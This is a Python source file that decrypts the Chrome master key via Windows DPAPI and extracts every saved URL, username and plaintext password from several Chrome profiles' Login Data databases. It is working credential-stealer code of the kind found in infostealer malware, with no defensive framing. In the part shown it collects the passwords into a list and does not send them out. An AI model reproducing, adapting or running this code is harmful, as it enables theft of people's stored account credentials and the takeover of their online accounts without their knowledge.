import os
import json
import base64
import shutil
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

def get_decryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error obtaining Chrome decryption key: {e}")
        return None

def decrypt_password(password, key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_pass = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_pass)
            return decrypted.decode()
        else:
            return CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except Exception as e:
        print(f"Error decrypting Chrome password: {e}")
        return None

def extract_chrome_data():
    key = get_decryption_key()
    if not key:
        return []

    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
    results = []

    for profile in profiles:
        login_db = os.path.join(base_path, profile, 'Login Data')
        if not os.path.exists(login_db):
            continue
        try:
            shutil.copy2(login_db, 'Login Data.db')
            conn = sqlite3.connect('Login Data.db')
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url, user, enc_pass = row
                password = decrypt_password(enc_pass, key)
                if password:
                    results.append({
                        'profile': profile,
                        'url': url,
                        'username': user,
                        'password': password
                    })
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Error reading Chrome data ({profile}): {e}")
        finally:
            if os.path.exists('Login Data.db'):
                os.remove('Login Data.db')
    return results
